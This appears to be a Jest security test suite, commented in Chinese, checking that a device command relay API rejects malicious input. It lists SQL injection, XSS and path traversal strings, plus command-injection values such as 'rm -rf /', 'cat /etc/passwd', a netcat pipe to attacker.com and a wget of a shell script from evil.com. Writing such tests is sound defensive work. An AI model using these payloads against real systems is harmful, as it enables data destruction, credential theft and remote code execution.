/**
 * 恶意输入安全测试
 * 测试各种恶意输入和攻击向量
 */

import { CicadaRelayApp } from '../../src/presentation/app';
import type { Env } from '../../src/types';

describe('恶意输入安全测试', () => {
  let app: CicadaRelayApp;
  let mockEnv: Env;
  let mockCtx: ExecutionContext;

  beforeEach(() => {
    mockEnv = {
      API_KEY: 'test-api-key',
      ENABLE_CORS: 'false',
      RATE_LIMIT_ENABLED: 'false',
      DEBUG_MODE: 'false',
      CICADA_SESSIONS: {} as any,
    };

    mockCtx = {
      waitUntil: jest.fn(),
      passThroughOnException: jest.fn(),
    } as any;

    app = new CicadaRelayApp(mockEnv);
  });

  const createPostRequest = (body: any): Request => {
    return new Request('http://localhost/api/command', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(body),
    });
  };

  describe('SQL 注入攻击', () => {
    it('应该拒绝包含 SQL 注入的 device_id', async () => {
      const maliciousInputs = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1' UNION SELECT * FROM users--",
        "admin'--",
        "' OR 1=1--",
      ];

      for (const malicious of maliciousInputs) {
        const request = createPostRequest({
          device_id: malicious,
          cmd: 'lock',
          ts: Date.now(),
          api_key: 'test-api-key',
        });

        const response = await app.handle(request, mockEnv, mockCtx);
        expect(response.status).toBeGreaterThanOrEqual(400);
      }
    });

    it('应该拒绝包含 SQL 注入的 cmd', async () => {
      const maliciousInputs = ["lock'; DROP TABLE commands; --", "lock' OR '1'='1"];

      for (const malicious of maliciousInputs) {
        const request = createPostRequest({
          device_id: 'MAC_1234567890ABCDEF1234567890ABCDEF',
          cmd: malicious,
          ts: Date.now(),
          api_key: 'test-api-key',
        });

        const response = await app.handle(request, mockEnv, mockCtx);
        expect(response.status).toBeGreaterThanOrEqual(400);
      }
    });
  });

  describe('XSS 攻击', () => {
    it('应该拒绝包含 XSS 脚本的输入', async () => {
      const maliciousInputs = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<svg onload=alert("XSS")>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
      ];

      for (const malicious of maliciousInputs) {
        const request = createPostRequest({
          device_id: malicious,
          cmd: 'lock',
          ts: Date.now(),
          api_key: 'test-api-key',
        });

        const response = await app.handle(request, mockEnv, mockCtx);
        expect(response.status).toBeGreaterThanOrEqual(400);
      }
    });
  });

  describe('命令注入攻击', () => {
    it('应该拒绝包含命令注入的输入', async () => {
      const maliciousInputs = [
        'lock; rm -rf /',
        'lock && cat /etc/passwd',
        'lock | nc attacker.com 1234',
        'lock`whoami`',
        'lock$(whoami)',
        'lock;$(wget http://evil.com/shell.sh)',
      ];

      for (const malicious of maliciousInputs) {
        const request = createPostRequest({
          device_id: 'MAC_1234567890ABCDEF1234567890ABCDEF',
          cmd: malicious,
          ts: Date.now(),
          api_key: 'test-api-key',
        });

        const response = await app.handle(request, mockEnv, mockCtx);
        expect(response.status).toBeGreaterThanOrEqual(400);
      }
    });
  });

  describe('路径遍历攻击', () => {
    it('应该拒绝包含路径遍历的输入', async () => {
      const maliciousInputs = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '/etc/passwd',
        'C:\\Windows\\System32\\config\\SAM',
      ];

      for (const malicious of maliciousInputs) {
        const request = createPostRequest({
          device_id: malicious,
          cmd: 'lock',
          ts: Date.now(),
          api_key: 'test-api-key',
        });

        const response = await app.handle(request, mockEnv, mockCtx);
        expect(response.status).toBeGreaterThanOrEqual(400);
      }
    });
  });

  describe('超大负载攻击', () => {
    it('应该拒绝超大的 device_id', async () => {
      const hugeDeviceId = 'A'.repeat(10000);
      const request = createPostRequest({
        device_id: hugeDeviceId,
        cmd: 'lock',
        ts: Date.now(),
        api_key: 'test-api-key',
      });

      const response = await app.handle(request, mockEnv, mockCtx);
      expect(response.status).toBeGreaterThanOrEqual(400);
    });

    it('应该拒绝超大的 cmd', async () => {
      const hugeCmd = 'lock' + 'A'.repeat(10000);
      const request = createPostRequest({
        device_id: 'MAC_1234567890ABCDEF1234567890ABCDEF',
        cmd: hugeCmd,
        ts: Date.now(),
        api_key: 'test-api-key',
      });

      const response = await app.handle(request, mockEnv, mockCtx);
      expect(response.status).toBeGreaterThanOrEqual(400);
    });

    it('应该拒绝超大的 JSON 负载', async () => {
      const hugeParams: Record<string, string> = {};
      for (let i = 0; i < 1000; i++) {
        hugeParams[`key${i}`] = 'A'.repeat(1000);
      }

      const request = createPostRequest({
        device_id: 'MAC_1234567890ABCDEF1234567890ABCDEF',
        cmd: 'lock',
        ts: Date.now(),
        api_key: 'test-api-key',
        params: hugeParams,
      });

      const response = await app.handle(request, mockEnv, mockCtx);
      // 可能因为负载太大而失败
      expect(response.status).toBeDefined();
    });
  });

  describe('特殊字符和编码攻击', () => {
    it('应该拒绝包含 null 字节的输入', async () => {
      const maliciousInputs = ['lock\x00', 'MAC_1234567890ABCDEF\x001234567890ABCDEF'];

      for (const malicious of maliciousInputs) {
        const request = createPostRequest({
          device_id: 'MAC_1234567890ABCDEF1234567890ABCDEF',
          cmd: malicious,
          ts: Date.now(),
          api_key: 'test-api-key',
        });

        const response = await app.handle(request, mockEnv, mockCtx);
        expect(response.status).toBeGreaterThanOrEqual(400);
      }
    });

    it('应该拒绝包含 Unicode 控制字符的输入', async () => {
      const maliciousInputs = [
        'lock\u0000',
        'lock\u0001\u0002\u0003',
        'lock\uFEFF', // Zero-width no-break space
      ];

      for (const malicious of maliciousInputs) {
        const request = createPostRequest({
          device_id: 'MAC_1234567890ABCDEF1234567890ABCDEF',
          cmd: malicious,
          ts: Date.now(),
          api_key: 'test-api-key',
        });

        const response = await app.handle(request, mockEnv, mockCtx);
        expect(response.status).toBeGreaterThanOrEqual(400);
      }
    });
  });

  describe('类型混淆攻击', () => {
    it('应该拒绝非字符串的 device_id', async () => {
      const maliciousInputs = [
        { device_id: 123, cmd: 'lock', ts: Date.now(), api_key: 'test-api-key' },
        { device_id: true, cmd: 'lock', ts: Date.now(), api_key: 'test-api-key' },
        { device_id: null, cmd: 'lock', ts: Date.now(), api_key: 'test-api-key' },
        { device_id: [], cmd: 'lock', ts: Date.now(), api_key: 'test-api-key' },
        { device_id: {}, cmd: 'lock', ts: Date.now(), api_key: 'test-api-key' },
      ];

      for (const malicious of maliciousInputs) {
        const request = createPostRequest(malicious);
        const response = await app.handle(request, mockEnv, mockCtx);
        expect(response.status).toBeGreaterThanOrEqual(400);
      }
    });

    it('应该拒绝非字符串的 cmd', async () => {
      const maliciousInputs = [
        {
          device_id: 'MAC_1234567890ABCDEF1234567890ABCDEF',
          cmd: 123,
          ts: Date.now(),
          api_key: 'test-api-key',
        },
        {
          device_id: 'MAC_1234567890ABCDEF1234567890ABCDEF',
          cmd: true,
          ts: Date.now(),
          api_key: 'test-api-key',
        },
        {
          device_id: 'MAC_1234567890ABCDEF1234567890ABCDEF',
          cmd: null,
          ts: Date.now(),
          api_key: 'test-api-key',
        },
      ];

      for (const malicious of maliciousInputs) {
        const request = createPostRequest(malicious);
        const response = await app.handle(request, mockEnv, mockCtx);
        expect(response.status).toBeGreaterThanOrEqual(400);
      }
    });

    it('应该拒绝非数字的 ts', async () => {
      const maliciousInputs = [
        {
          device_id: 'MAC_1234567890ABCDEF1234567890ABCDEF',
          cmd: 'lock',
          ts: 'not-a-number',
          api_key: 'test-api-key',
        },
        {
          device_id: 'MAC_1234567890ABCDEF1234567890ABCDEF',
          cmd: 'lock',
          ts: true,
          api_key: 'test-api-key',
        },
        {
          device_id: 'MAC_1234567890ABCDEF1234567890ABCDEF',
          cmd: 'lock',
          ts: null,
          api_key: 'test-api-key',
        },
      ];

      for (const malicious of maliciousInputs) {
        const request = createPostRequest(malicious);
        const response = await app.handle(request, mockEnv, mockCtx);
        expect(response.status).toBeGreaterThanOrEqual(400);
      }
    });
  });

  describe('重放攻击', () => {
    it('应该拒绝重复的时间戳（模拟重放攻击）', async () => {
      const timestamp = Date.now();
      const request1 = createPostRequest({
        device_id: 'MAC_1234567890ABCDEF1234567890ABCDEF',
        cmd: 'lock',
        ts: timestamp,
        api_key: 'test-api-key',
      });

      const request2 = createPostRequest({
        device_id: 'MAC_1234567890ABCDEF1234567890ABCDEF',
        cmd: 'lock',
        ts: timestamp,
        api_key: 'test-api-key',
      });

      // 第一次请求
      await app.handle(request1, mockEnv, mockCtx);

      // 第二次请求（重放）
      // 注意：当前实现可能不会拒绝重放攻击，因为没有 nonce
      // 但至少应该通过时间戳验证
      const response2 = await app.handle(request2, mockEnv, mockCtx);
      expect(response2.status).toBeDefined();
    });
  });
});
